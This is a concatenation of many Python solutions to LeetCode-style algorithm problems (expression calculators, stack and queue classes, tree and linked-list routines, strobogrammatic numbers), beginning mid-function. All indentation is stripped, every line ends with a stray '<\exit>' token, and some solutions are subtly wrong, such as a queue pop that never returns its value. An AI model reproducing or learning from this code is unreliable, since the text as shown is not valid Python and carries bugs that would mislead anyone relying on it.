if s[i] in ("+", "-"):<\exit>
operand = 0<\exit>
prev_op = s[i]<\exit>
elif s[i] in (")", "\0"):<\exit>
return sum(stk), i<\exit>
elif s[i] == "(":<\exit>
operand, i = self.eval(s, i + 1, [])<\exit>
else:<\exit>
raise<\exit>
i += 1<\exit>
if __name__ == "__main__":<\exit>
assert Solution().calculate("(1+(4+5+2)-3)+(6+8)") == 23<\exit>
class Solution:<\exit>
def calculate(self, s):<\exit>
lst = self.to_list(s)<\exit>
postfix = self.infix2postfix(lst)<\exit>
return self.eval_postfix(postfix)<\exit>
def to_list(self, s):<\exit>
i = 0<\exit>
ret = []<\exit>
while i < len(s):<\exit>
if s[i] == " ":<\exit>
i += 1<\exit>
elif s[i] in ("(", ")", "+", "-"):<\exit>
ret.append(s[i])<\exit>
i += 1<\exit>
else:<\exit>
b = i<\exit>
while i < len(s) and s[i].isdigit():<\exit>
i += 1<\exit>
ret.append(s[b:i])<\exit>
return ret<\exit>
def infix2postfix(self, lst):<\exit>
stk = []<\exit>
ret = []<\exit>
for elt in lst:<\exit>
if elt.isdigit():<\exit>
ret.append(elt)<\exit>
elif elt == "(":<\exit>
stk.append(elt)<\exit>
elif elt == ")":<\exit>
while stk[-1] != "(":<\exit>
ret.append(stk.pop())<\exit>
stk.pop()<\exit>
else:<\exit>
while stk and self.precendece(elt) <= self.precendece(stk[-1]):<\exit>
ret.append(stk.pop())<\exit>
stk.append(elt)<\exit>
while stk:<\exit>
ret.append(stk.pop())<\exit>
return ret<\exit>
def precendece(self, op):<\exit>
if op in ("(", ")"):<\exit>
return 0<\exit>
if op in ("+", "-"):<\exit>
return 1<\exit>
def eval_postfix(self, post):<\exit>
stk = []<\exit>
for elt in post:<\exit>
if elt in ("+", "-"):<\exit>
b = int(stk.pop())<\exit>
a = int(stk.pop())<\exit>
if elt == "+":<\exit>
stk.append(a+b)<\exit>
else:<\exit>
stk.append(a-b)<\exit>
else:<\exit>
stk.append(elt)<\exit>
assert len(stk) == 1<\exit>
return int(stk[-1])<\exit>
if __name__ == "__main__":<\exit>
assert Solution().calculate(" 2-1 + 2 ") == 3<\exit>
assert Solution().calculate("(1+(4+5+2)-3)+(6+8)") == 23<\exit>
class Stack:<\exit>
def __init__(self):<\exit>
self.q = [[], []]<\exit>
def push(self, x):<\exit>
t = 0<\exit>
if not self.q[t]:<\exit>
t ^= 1<\exit>
self.q[t].append(x)<\exit>
def pop(self):<\exit>
t = 0<\exit>
if not self.q[t]:<\exit>
t ^= 1<\exit>
while len(self.q[t]) > 1:<\exit>
self.q[t^1].append(self.q[t].pop(0))<\exit>
return self.q[t].pop()<\exit>
def top(self):<\exit>
popped = self.pop()<\exit>
t = 0<\exit>
if not self.q[t]:<\exit>
t ^= 1<\exit>
self.q[t].append(popped)<\exit>
return popped<\exit>
def empty(self):<\exit>
return not self.q[0] and not self.q[1]<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def invertTree_recur(self, root):<\exit>
if not root:<\exit>
return None<\exit>
self.invertTree_recur(root.left)<\exit>
self.invertTree_recur(root.right)<\exit>
root.left, root.right = root.right, root.left<\exit>
return root<\exit>
def invertTree(self, root):<\exit>
if not root:<\exit>
return None<\exit>
stk = []<\exit>
post = []<\exit>
stk.append(root)<\exit>
cur = None<\exit>
while stk:<\exit>
cur = stk.pop()<\exit>
post.append(cur)<\exit>
if cur.left:<\exit>
stk.append(cur.left)<\exit>
if cur.right:<\exit>
stk.append(cur.right)<\exit>
while post:<\exit>
cur = post.pop()<\exit>
cur.left, cur.right = cur.right, cur.left<\exit>
return cur<\exit>
class Solution:<\exit>
def calculate(self, s: str) -> int:<\exit>
operand = 0<\exit>
stk = []<\exit>
prev_op = "+"<\exit>
for i, c in enumerate(s):<\exit>
if c.isdigit():<\exit>
operand = operand * 10 + int(c)<\exit>
delimited = c in ("+", "-", "*", "/") or i == len(s) - 1<\exit>
if delimited:<\exit>
if prev_op == "+":<\exit>
cur = operand<\exit>
elif prev_op == "-":<\exit>
cur = -operand<\exit>
elif prev_op == "*":<\exit>
cur = stk.pop() * operand<\exit>
else:<\exit>
assert prev_op == "/"<\exit>
cur = int(stk.pop() / operand)<\exit>
stk.append(cur)<\exit>
prev_op = c<\exit>
operand = 0<\exit>
return sum(stk)<\exit>
def calculate_error(self, s: str) -> int:<\exit>
operand = 0<\exit>
stk = []<\exit>
prev_op = "+"<\exit>
for i, c in enumerate(s):<\exit>
if c.isdigit():<\exit>
operand = operand * 10 + int(c)<\exit>
delimited = c in ("+", "-", "*", "/") or i == len(s) - 1<\exit>
if delimited:<\exit>
cur = {<\exit>
"+": operand,<\exit>
"-": -operand,<\exit>
"*": stk.pop() * operand,<\exit>
"/": int(stk.pop() / operand),<\exit>
}[prev_op]<\exit>
stk.append(cur)<\exit>
prev_op = c<\exit>
operand = 0<\exit>
return sum(stk)<\exit>
if __name__ == "__main__":<\exit>
assert Solution().calculate("3+2*2") == 7<\exit>
class Solution:<\exit>
def calculate(self, s):<\exit>
lst = self.parse(s)<\exit>
post = self.infix2postfix(lst)<\exit>
return self.eval_postfix(post)<\exit>
def parse(self, s):<\exit>
i = 0<\exit>
ret = []<\exit>
while i < len(s):<\exit>
if s[i] == " ":<\exit>
i += 1<\exit>
elif s[i] in ("(", ")", "+", "-", "*", "/"):<\exit>
ret.append(s[i])<\exit>
i += 1<\exit>
else:<\exit>
b = i<\exit>
while i < len(s) and s[i].isdigit():<\exit>
i += 1<\exit>
ret.append(s[b:i])<\exit>
return ret<\exit>
def infix2postfix(self, lst):<\exit>
stk = []<\exit>
ret = []<\exit>
for elt in lst:<\exit>
if elt.isdigit():<\exit>
ret.append(elt)<\exit>
elif elt == "(":<\exit>
stk.append(elt)<\exit>
elif elt == ")":<\exit>
while stk[-1] != "(":<\exit>
ret.append(stk.pop())<\exit>
stk.pop()<\exit>
else:<\exit>
while stk and self.precendece(elt) <= self.precendece(stk[-1]):<\exit>
ret.append(stk.pop())<\exit>
stk.append(elt)<\exit>
while stk:<\exit>
ret.append(stk.pop())<\exit>
return ret<\exit>
def precendece(self, op):<\exit>
if op in ("(", ")"):<\exit>
return 0<\exit>
if op in ("+", "-"):<\exit>
return 1<\exit>
if op in ("*", "/"):<\exit>
return 2<\exit>
return 3<\exit>
def eval_postfix(self, post):<\exit>
stk = []<\exit>
for elt in post:<\exit>
if elt in ("+", "-", "*", "/"):<\exit>
b = int(stk.pop())<\exit>
a = int(stk.pop())<\exit>
if elt == "+":<\exit>
stk.append(a+b)<\exit>
elif elt == "-":<\exit>
stk.append(a-b)<\exit>
elif elt == "*":<\exit>
stk.append(a*b)<\exit>
else:<\exit>
stk.append(a/b)<\exit>
else:<\exit>
stk.append(elt)<\exit>
assert len(stk) == 1<\exit>
return int(stk[-1])<\exit>
if __name__ == "__main__":<\exit>
assert Solution().calculate("3+2*2") == 7<\exit>
class Solution:<\exit>
def summaryRanges(self, nums):<\exit>
ret = []<\exit>
n = len(nums)<\exit>
if n < 1:<\exit>
return ret<\exit>
bgn = nums[0]<\exit>
pre = nums[0]<\exit>
for i in xrange(1, n):<\exit>
if nums[i] != pre+1:<\exit>
if pre != bgn:<\exit>
ret.append("%d->%d"%(bgn, pre))<\exit>
else:<\exit>
ret.append("%d"%bgn)<\exit>
bgn = nums[i]<\exit>
pre = nums[i]<\exit>
if pre != bgn:<\exit>
ret.append("%d->%d"%(bgn, pre))<\exit>
else:<\exit>
ret.append("%d"%bgn)<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().summaryRanges([0, 1, 2, 4, 5, 7]) == ['0->2', '4->5', '7']<\exit>
from collections import defaultdict<\exit>
class Solution:<\exit>
def majorityElement(self, nums):<\exit>
cnt = defaultdict(int)<\exit>
for num in nums:<\exit>
if num in cnt:<\exit>
cnt[num] += 1<\exit>
else:<\exit>
if len(cnt) < 3-1:<\exit>
cnt[num] += 1<\exit>
else:<\exit>
for k in cnt.keys():<\exit>
cnt[k] -= 1<\exit>
if cnt[k] == 0:<\exit>
del cnt[k]<\exit>
ret = []<\exit>
for k in cnt.keys():<\exit>
if len(filter(lambda x: x == k, nums)) > len(nums)/2:<\exit>
ret.append(k)<\exit>
return ret<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def kthSmallest(self, root, k):<\exit>
l = self.cnt(root.left)<\exit>
if l+1 == k:<\exit>
return root.val<\exit>
elif l+1 < k:<\exit>
return self.kthSmallest(root.right, k-(l+1))<\exit>
else:<\exit>
return self.kthSmallest(root.left, k)<\exit>
def cnt(self, root):<\exit>
if not root:<\exit>
return 0<\exit>
return 1+self.cnt(root.left)+self.cnt(root.right)<\exit>
class Solution:<\exit>
def isPowerOfTwo(self, n):<\exit>
if n <= 0:<\exit>
return False<\exit>
return n & (n-1) == 0<\exit>
class Queue:<\exit>
def __init__(self):<\exit>
self.in_stk = []<\exit>
self.out_stk = []<\exit>
def push(self, x):<\exit>
self.in_stk.append(x)<\exit>
def pop(self):<\exit>
if not self.out_stk:<\exit>
while self.in_stk:<\exit>
self.out_stk.append(self.in_stk.pop())<\exit>
self.out_stk.pop()<\exit>
def peek(self):<\exit>
if not self.out_stk:<\exit>
while self.in_stk:<\exit>
self.out_stk.append(self.in_stk.pop())<\exit>
return self.out_stk[-1]<\exit>
def empty(self):<\exit>
return not self.out_stk and not self.in_stk<\exit>
class Solution:<\exit>
def countDigitOne(self, n):<\exit>
if n < 1:<\exit>
return 0<\exit>
cnt = 0<\exit>
sig = 1<\exit>
while n/sig:<\exit>
temp = sig*10<\exit>
cur_digit = (n/sig)%10<\exit>
hi_digit = n/temp<\exit>
lo_digit = n%sig<\exit>
if cur_digit > 1:<\exit>
cnt += (hi_digit+1)*sig<\exit>
elif cur_digit == 1:<\exit>
cnt += hi_digit*sig + (lo_digit+1)<\exit>
else:<\exit>
cnt += hi_digit*sig<\exit>
sig = temp<\exit>
return cnt<\exit>
class ListNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.next = None<\exit>
class Solution:<\exit>
def isPalindrome(self, head):<\exit>
n = self.len(head)<\exit>
m = n/2<\exit>
mid = self.get(head, m)<\exit>
if n%2 != 0:<\exit>
mid = mid.next<\exit>
mid = self.reverse(mid)<\exit>
while head and mid:<\exit>
if head.val != mid.val:<\exit>
return False<\exit>
head = head.next<\exit>
mid = mid.next<\exit>
return True<\exit>
def len(self, head):<\exit>
cnt = 0<\exit>
cur = head<\exit>
while cur:<\exit>
cnt += 1<\exit>
cur = cur.next<\exit>
return cnt<\exit>
def get(self, head, n):<\exit>
cnt = 0<\exit>
cur = head<\exit>
while cnt < n:<\exit>
cnt += 1<\exit>
cur = cur.next<\exit>
return cur<\exit>
def reverse(self, head):<\exit>
if not head:<\exit>
return head<\exit>
dummy = ListNode(0)<\exit>
dummy.next = head<\exit>
pre, cur = dummy, dummy.next<\exit>
while cur:<\exit>
nxt = cur.next<\exit>
cur.next = pre<\exit>
pre, cur = cur, nxt<\exit>
if head: head.next = None<\exit>
return pre<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def lowestCommonAncestor(self, root: TreeNode, p: TreeNode, q: TreeNode) -> TreeNode:<\exit>
return self.walk(root, p, q)<\exit>
def walk(self, node, p, q):<\exit>
if p.val > node.val and q.val > node.val:<\exit>
return self.walk(node.right, p, q)<\exit>
if p.val < node.val and q.val < node.val:<\exit>
return self.walk(node.left, p, q)<\exit>
return node<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def lowestCommonAncestor(self, root, p, q):<\exit>
cur = root<\exit>
while True:<\exit>
if p.val < cur.val and q.val < cur.val:<\exit>
cur = cur.left<\exit>
elif p.val > cur.val and q.val > cur.val:<\exit>
cur = cur.right<\exit>
else:<\exit>
return cur<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def __init__(self):<\exit>
self.ans = None<\exit>
def lowestCommonAncestor(self, root: TreeNode, p: TreeNode, q: TreeNode) -> TreeNode:<\exit>
self.count(root, p, q)<\exit>
return self.ans<\exit>
def count(self, node, p, q):<\exit>
if not node:<\exit>
return 0<\exit>
lcount = self.count(node.left, p, q)<\exit>
rcount = self.count(node.right, p, q)<\exit>
mcount = 1 if node == p or node == q else 0<\exit>
ret = lcount + rcount + mcount<\exit>
if lcount == 1 and rcount == 1 or lcount == 1 and mcount == 1 or rcount == 1 and mcount == 1:<\exit>
self.ans = node<\exit>
return ret<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def lowestCommonAncestor(self, root, p, q):<\exit>
path1, path2 = [], []<\exit>
self.dfs(root, p, path1, [False])<\exit>
self.dfs(root, q, path2, [False])<\exit>
i = 0<\exit>
while i < min(len(path1), len(path2)):<\exit>
if path1[i] != path2[i]:<\exit>
return path1[i-1]<\exit>
i += 1<\exit>
return path1[i-1]<\exit>
def dfs(self, root, t, path, found):<\exit>
if not root or found[0]:<\exit>
return<\exit>
path.append(root)<\exit>
if root == t:<\exit>
found[0] = True<\exit>
self.dfs(root.left, t, path, found)<\exit>
self.dfs(root.right, t, path, found)<\exit>
if not found[0]:<\exit>
path.pop()<\exit>
class ListNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.next = None<\exit>
class Solution:<\exit>
def deleteNode(self, node):<\exit>
cur = node<\exit>
while cur.next:<\exit>
cur.val = cur.next.val<\exit>
if not cur.next.next:<\exit>
cur.next = None<\exit>
break<\exit>
cur = cur.next<\exit>
class Solution:<\exit>
def productExceptSelf(self, nums):<\exit>
n = len(nums)<\exit>
left = [1 for _ in xrange(n+1)]<\exit>
right = [1 for _ in xrange(n+1)]<\exit>
for i in xrange(1, n+1):<\exit>
left[i] = left[i-1]*nums[i-1]<\exit>
for i in xrange(n-1, -1, -1):<\exit>
right[i] = right[i+1]*nums[i]<\exit>
return [left[i]*right[i+1] for i in xrange(n)]<\exit>
class Solution:<\exit>
def maxSlidingWindow(self, nums, k):<\exit>
q = []<\exit>
ret = []<\exit>
n = len(nums)<\exit>
for i in xrange(n):<\exit>
while q and q[0] <= i-k:<\exit>
q.pop(0)<\exit>
while q and nums[q[-1]] < nums[i]:<\exit>
q.pop()<\exit>
q.append(i)<\exit>
if i >= k-1:<\exit>
ret.append(nums[q[0]])<\exit>
return ret<\exit>
class Solution(object):<\exit>
def searchMatrix(self, mat, target):<\exit>
m = len(mat)<\exit>
n = len(mat[0])<\exit>
i = 0<\exit>
j = n-1<\exit>
while i < m and 0 <= j:<\exit>
if mat[i][j] == target:<\exit>
return True<\exit>
elif mat[i][j] > target:<\exit>
j -= 1<\exit>
else:<\exit>
i += 1<\exit>
return False<\exit>
class SolutionBinSearch(object):<\exit>
def searchMatrix(self, mat, target):<\exit>
m = len(mat)<\exit>
n = len(mat[0])<\exit>
col = [mat[i][0] for i in xrange(m)]<\exit>
row_by_first = self.bin_search(col, target)<\exit>
col = [mat[i][-1] for i in xrange(m)]<\exit>
row_by_last = self.bin_search(col, target, False)<\exit>
for i in range(row_by_first, row_by_last-1, -1):<\exit>
col = self.bin_search(mat[i], target)<\exit>
if mat[i][col] == target:<\exit>
return True<\exit>
return False<\exit>
def bin_search(self, A, t, lower=True):<\exit>
lo = 0<\exit>
hi = len(A)<\exit>
while lo < hi:<\exit>
mid = (lo+hi)/2<\exit>
if A[mid] == t:<\exit>
return mid<\exit>
elif A[mid] < t:<\exit>
lo = mid+1<\exit>
else:<\exit>
hi = mid<\exit>
if lower:<\exit>
return lo-1<\exit>
else:<\exit>
return lo<\exit>
if __name__ == "__main__":<\exit>
assert Solution().searchMatrix([[1, 4], [2, 5]], 4) == True<\exit>
assert SolutionBinSearch().searchMatrix([[1, 4], [2, 5]], 4) == True<\exit>
import re<\exit>
class Solution:<\exit>
def diffWaysToCompute(self, input):<\exit>
input_lst = re.split(r"(\D)", input)<\exit>
nums = map(int, filter(lambda x: re.match(r"\d+", x), input_lst))<\exit>
ops = filter(lambda x: re.match(r"\D", x), input_lst)<\exit>
ret = self.dfs_eval(nums, ops)<\exit>
return ret<\exit>
def dfs_eval(self, nums, ops):<\exit>
ret = []<\exit>
if not ops:<\exit>
assert len(nums) == 1<\exit>
return nums<\exit>
for i, op in enumerate(ops):<\exit>
left_vals = self.dfs_eval(nums[:i+1], ops[:i])<\exit>
right_vals = self.dfs_eval(nums[i+1:], ops[i+1:])<\exit>
for l in left_vals:<\exit>
for r in right_vals:<\exit>
ret.append(self._eval(l, r, op))<\exit>
return ret<\exit>
def _eval(self, a, b, op):<\exit>
return {<\exit>
"+": lambda a, b: a+b,<\exit>
"-": lambda a, b: a-b,<\exit>
"*": lambda a, b: a*b,<\exit>
}[op](a, b)<\exit>
if __name__ == "__main__":<\exit>
assert Solution().diffWaysToCompute("1+1") == [2]<\exit>
from collections import defaultdict<\exit>
class Solution:<\exit>
def isAnagram(self, s, t):<\exit>
cnt = defaultdict(int)<\exit>
for c in s:<\exit>
cnt[c] += 1<\exit>
for c in t:<\exit>
if c not in cnt or cnt[c] < 1:<\exit>
return False<\exit>
cnt[c] -= 1<\exit>
for v in cnt.values():<\exit>
if v != 0:<\exit>
return False<\exit>
return True<\exit>
import sys<\exit>
from bisect import bisect_left<\exit>
class Solution:<\exit>
def shortestDistance(self, words, word1, word2):<\exit>
lst1 = [i for i, v in enumerate(words) if v == word1]<\exit>
lst2 = [i for i, v in enumerate(words) if v == word2]<\exit>
mini = sys.maxint<\exit>
for i in lst1:<\exit>
idx = bisect_left(lst2, i)<\exit>
for nei in (-1, 0):<\exit>
if 0 <= idx+nei < len(lst2):<\exit>
mini = min(mini, abs(i-lst2[idx+nei]))<\exit>
return mini<\exit>
from bisect import bisect_left<\exit>
from collections import defaultdict<\exit>
import sys<\exit>
class WordDistance(object):<\exit>
def __init__(self, words):<\exit>
self.word_dict = defaultdict(list)<\exit>
for i, w in enumerate(words):<\exit>
self.word_dict[w].append(i)<\exit>
def shortest(self, word1, word2):<\exit>
mini = sys.maxint<\exit>
for i in self.word_dict[word1]:<\exit>
idx = bisect_left(self.word_dict[word2], i)<\exit>
for nei in (-1, 0):<\exit>
if 0 <= idx+nei < len(self.word_dict[word2]):<\exit>
mini = min(mini, abs(i-self.word_dict[word2][idx+nei]))<\exit>
return mini<\exit>
import sys<\exit>
from bisect import bisect_left<\exit>
class Solution(object):<\exit>
def shortestWordDistance(self, words, word1, word2):<\exit>
pos_lst1 = [pos for pos, v in enumerate(words) if v == word1]<\exit>
pos_lst2 = [pos for pos, v in enumerate(words) if v == word2]<\exit>
mini = sys.maxint<\exit>
for pos in pos_lst1:<\exit>
idx = bisect_left(pos_lst2, pos)<\exit>
for nei in (-1, 0):<\exit>
if 0 <= idx+nei < len(pos_lst2) and pos != pos_lst2[idx+nei]:<\exit>
mini = min(mini, abs(pos-pos_lst2[idx+nei]))<\exit>
return mini<\exit>
class Solution:<\exit>
def __init__(self):<\exit>
self.map = {<\exit>
"1": "1",<\exit>
"6": "9",<\exit>
"9": "6",<\exit>
"8": "8",<\exit>
"0": "0"<\exit>
}<\exit>
def isStrobogrammatic(self, num):<\exit>
for i in xrange(len(num)/2+1):<\exit>
if num[i] not in self.map or self.map[num[i]] != num[len(num)-1-i]:<\exit>
return False<\exit>
return True<\exit>
def isStrobogrammatic_tedious(self, num):<\exit>
num = list(num)<\exit>
rev = []<\exit>
for digit in reversed(num):<\exit>
try:<\exit>
rev.append(self.map[digit])<\exit>
except KeyError:<\exit>
return False<\exit>
return num == rev<\exit>
from collections import deque<\exit>
class Solution(object):<\exit>
def __init__(self):<\exit>
self.lst = ["11", "69", "88", "96", "00"]<\exit>
self.middle = ["0", "1", "8"]<\exit>
def findStrobogrammatic(self, n):<\exit>
ret = []<\exit>
self.build(n, deque(), ret)<\exit>
return ret<\exit>
def build(self, n, cur, ret):<\exit>
if n%2 == 1 and len(cur) == 0:<\exit>
for elt in self.middle:<\exit>
cur.append(elt)<\exit>
self.build(n, cur, ret)<\exit>
cur.pop()<\exit>
else:<\exit>
if len(cur) == n:<\exit>
ret.append("".join(cur))<\exit>
return<\exit>
for elt in self.lst:<\exit>
if not (elt == "00" and len(cur) == n-2):<\exit>
cur.appendleft(elt[0])<\exit>
cur.append(elt[1])<\exit>
self.build(n, cur, ret)<\exit>
cur.pop()<\exit>
cur.popleft()<\exit>
class SolutionArray(object):<\exit>
def __init__(self):<\exit>
self.map1 = ["11", "69", "88", "96", "00"]<\exit>
def findStrobogrammatic(self, n):<\exit>
ret = []<\exit>
self.build(n, [], ret)<\exit>
return ret<\exit>
def build(self, n, cur, ret):<\exit>
if n%2 == 1 and len(cur) == 0:<\exit>
for i in ["0", "1", "8"]:<\exit>
cur.append(i)<\exit>
self.build(n, cur, ret)<\exit>
cur.pop()<\exit>
return<\exit>
if len(cur)/2 == n/2:<\exit>
ret.append("".join(cur))<\exit>
return<\exit>
for elt in self.map1:<\exit>
if elt != "00" or len(cur) != n-2:<\exit>
cur.insert(0, elt[0])<\exit>
cur.append(elt[1])<\exit>
self.build(n, cur, ret)<\exit>
cur.pop()<\exit>
cur.pop(0)<\exit>
class SolutionOutputLimitExceeded(object):<\exit>
def __init__(self):<\exit>
self.map = {<\exit>
"1": "1",<\exit>
"6": "9",<\exit>
"9": "6",<\exit>
"8": "8",<\exit>
"0": "0"<\exit>
}<\exit>
self.middle = ["1", "8", "0"]<\exit>
def findStrobogrammatic(self, n):<\exit>
ret = []<\exit>
self.build(0, n, [], ret)<\exit>
return ret<\exit>
def build(self, idx, n, cur, ret):<\exit>
if idx == n/2:<\exit>
if n % 2 != 0:<\exit>
for m in self.middle:<\exit>
if m != "0" or idx != 0:<\exit>
temp = list(cur)<\exit>
temp.append(m)<\exit>
for i in xrange(idx-1, -1, -1):<\exit>
temp.append(self.map[temp[i]])<\exit>
ret.append("".join(temp))<\exit>
else:<\exit>
temp = list(cur)<\exit>
for i in xrange(idx-1, -1, -1):<\exit>
temp.append(self.map[temp[i]])<\exit>
ret.append("".join(temp))<\exit>
return<\exit>
for k in self.map.keys():<\exit>
if k != "0" or idx != 0:<\exit>
cur.append(k)<\exit>
self.build(idx+1, n, cur, ret)<\exit>
cur.pop()<\exit>
if __name__ == "__main__":<\exit>
assert Solution().findStrobogrammatic(3) == ['101', '609', '808', '906', '111', '619', '818', '916', '181', '689', '888', '986']<\exit>
from collections import deque<\exit>
class Solution(object):<\exit>
def __init__(self):<\exit>
self.lst = ["11", "69", "88", "96", "00"]<\exit>
self.middle = ["0", "1", "8"]<\exit>
def strobogrammaticInRange(self, low, high):<\exit>
cnt = 0<\exit>
for l in xrange(len(low), len(high)+1):<\exit>
cnt += len(filter(lambda x: int(low) <= int(x) <= int(high), self.strobogrammatic(l)))<\exit>
return cnt<\exit>
def strobogrammatic(self, n):<\exit>
ret = []<\exit>
self.build(n, deque(), ret)<\exit>
return ret<\exit>
def build(self, n, cur, ret):<\exit>
if n%2 == 1 and len(cur) == 0:<\exit>
for elt in self.middle:<\exit>
cur.append(elt)<\exit>
self.build(n, cur, ret)<\exit>
cur.pop()<\exit>
else:<\exit>
if len(cur) == n:<\exit>
ret.append("".join(cur))<\exit>
return<\exit>
for elt in self.lst:<\exit>
if not (elt == "00" and len(cur) == n-2):<\exit>
cur.appendleft(elt[0])<\exit>
cur.append(elt[1])<\exit>
self.build(n, cur, ret)<\exit>
cur.pop()<\exit>
cur.popleft()<\exit>
from collections import defaultdict<\exit>
class Solution:<\exit>
def groupStrings(self, strings):<\exit>
hm = defaultdict(list)<\exit>
for s in strings:<\exit>
if len(s) == 1:<\exit>
hm[0].append(s)<\exit>
else:<\exit>
lst = []<\exit>
for i in xrange(1, len(s)):<\exit>
lst.append((ord(s[i])-ord(s[i-1]))%26)<\exit>
hm[tuple(lst)].append(s)<\exit>
return map(sorted, hm.values())<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def __init__(self):<\exit>
self.cnt = 0<\exit>
def countUnivalSubtrees(self, root):<\exit>
self.is_unival(root)<\exit>
return self.cnt<\exit>
def is_unival(self, cur):<\exit>
if not cur:<\exit>
return True<\exit>
is_left = self.is_unival(cur.left)<\exit>
is_right = self.is_unival(cur.right)<\exit>
if (not is_left or not is_right or<\exit>
cur.left and cur.left.val != cur.val or<\exit>
cur.right and cur.right.val != cur.val):<\exit>
return False<\exit>
else:<\exit>
self.cnt += 1<\exit>
return True<\exit>
class Vector2D:<\exit>
def __init__(self, vec2d):<\exit>
self.vec2d = vec2d<\exit>
self.i = 0<\exit>
self.j = 0<\exit>
def next(self):<\exit>
ret = None<\exit>
if self.hasNext():<\exit>
ret = self.vec2d[self.i][self.j]<\exit>
self.j += 1<\exit>
return ret<\exit>
def hasNext(self):<\exit>
while self.i < len(self.vec2d) and self.j >= len(self.vec2d[self.i]):<\exit>
self.i += 1<\exit>
self.j = 0<\exit>
return self.i < len(self.vec2d) and self.j < len(self.vec2d[self.i])<\exit>
import operator<\exit>
class Interval:<\exit>
def __init__(self, s=0, e=0):<\exit>
self.start = s<\exit>
self.end = e<\exit>
class Solution:<\exit>
def canAttendMeetings(self, intervals):<\exit>
intervals.sort(key=operator.attrgetter("start"))<\exit>
for i in xrange(len(intervals)-1):<\exit>
if intervals[i].end > intervals[i+1].start:<\exit>
return False<\exit>
return True<\exit>
import heapq<\exit>
import operator<\exit>
class Interval:<\exit>
def __init__(self, s=0, e=0):<\exit>
self.start = s<\exit>
self.end = e<\exit>
class Solution(object):<\exit>
def minMeetingRooms(self, intervals):<\exit>
maxa = 0<\exit>
intervals.sort(key=operator.attrgetter("start"))<\exit>
h_end = []<\exit>
for itvl in intervals:<\exit>
heapq.heappush(h_end, itvl.end)<\exit>
while h_end and h_end[0] <= itvl.start:<\exit>
heapq.heappop(h_end)<\exit>
maxa = max(maxa, len(h_end))<\exit>
return maxa<\exit>
from math import sqrt<\exit>
class Solution:<\exit>
def getFactors(self, n):<\exit>
ret = []<\exit>
self.dfs([n], ret)<\exit>
return ret<\exit>
def dfs(self, cur, ret):<\exit>
if len(cur) > 1:<\exit>
ret.append(list(cur))<\exit>
n = cur.pop()<\exit>
start = cur[-1] if cur else 2<\exit>
for i in xrange(start, int(sqrt(n))+1):<\exit>
if n % i == 0:<\exit>
cur.append(i)<\exit>
cur.append(n/i)<\exit>
self.dfs(cur, ret)<\exit>
cur.pop()<\exit>
def dfs2(self, n, cur, ret):<\exit>
if n > 1 and cur and len(cur) >= 1:<\exit>
ret.append(list(cur)+[n])<\exit>
start = cur[-1] if cur else 2<\exit>
for i in xrange(start, int(sqrt(n))+1):<\exit>
if n%i == 0:<\exit>
cur.append(i)<\exit>
self.dfs(n/i, cur, ret)<\exit>
cur.pop()<\exit>
def dfs_TLE(self, n, cur, ret):<\exit>
if n == 1 and cur and len(cur) >= 2:<\exit>
ret.append(list(cur))<\exit>
if cur:<\exit>
start = cur[-1]<\exit>
else:<\exit>
start = 2<\exit>
for i in xrange(start, int(sqrt(n+1))):<\exit>
if n%i == 0:<\exit>
cur.append(i)<\exit>
self.dfs_TLE(n/i, cur, ret)<\exit>
cur.pop()<\exit>
if __name__ == "__main__":<\exit>
print Solution().getFactors(16)<\exit>
class Solution:<\exit>
def verifyPreorder(self, preorder):<\exit>
left_finished = None<\exit>
stk = []<\exit>
for num in preorder:<\exit>
if left_finished and num < left_finished:<\exit>
return False<\exit>
while stk and stk[-1] < num:<\exit>
left_finished = stk.pop()<\exit>
stk.append(num)<\exit>
return True<\exit>
if __name__ == "__main__":<\exit>
preorder = [3, 5, 2, 1, 4, 7, 6, 9, 8, 10]<\exit>
assert Solution().verifyPreorder(preorder) == False<\exit>
import sys<\exit>
class Solution:<\exit>
def minCost(self, costs):<\exit>
if not costs:<\exit>
return 0<\exit>
n = len(costs)<\exit>
m = len(costs[0])<\exit>
F = [[0 for _ in xrange(m)] for _ in xrange(n+1)]<\exit>
for k in xrange(1, n+1):<\exit>
for i in xrange(m):<\exit>
F[k][i] = sys.maxint<\exit>
for j in xrange(m):<\exit>
if i != j:<\exit>
F[k][i] = min(F[k][i], F[k-1][j]+costs[k-1][i])<\exit>
return min(F[n][i] for i in xrange(m))<\exit>
if __name__ == "__main__":<\exit>
costs = [[7, 6, 2]]<\exit>
assert Solution().minCost(costs) == 2<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def binaryTreePaths(self, root):<\exit>
if not root:<\exit>
return []<\exit>
ret = []<\exit>
self.dfs(root, [], ret)<\exit>
return ret<\exit>
def dfs(self, cur, path, ret):<\exit>
path.append(cur)<\exit>
if not cur.left and not cur.right:<\exit>
ret.append("->".join(map(lambda x: str(x.val), path)))<\exit>
return<\exit>
if cur.left:<\exit>
self.dfs(cur.left, path, ret)<\exit>
path.pop()<\exit>
if cur.right:<\exit>
self.dfs(cur.right, path, ret)<\exit>
path.pop()<\exit>
def dfs_path(self, cur, path, ret):<\exit>
if not cur:<\exit>
return<\exit>
path.append(cur)<\exit>
if not cur.left and not cur.right:<\exit>
ret.append("->".join(map(lambda x: str(x.val), path)))<\exit>
self.dfs_path(cur.left, path, ret)<\exit>
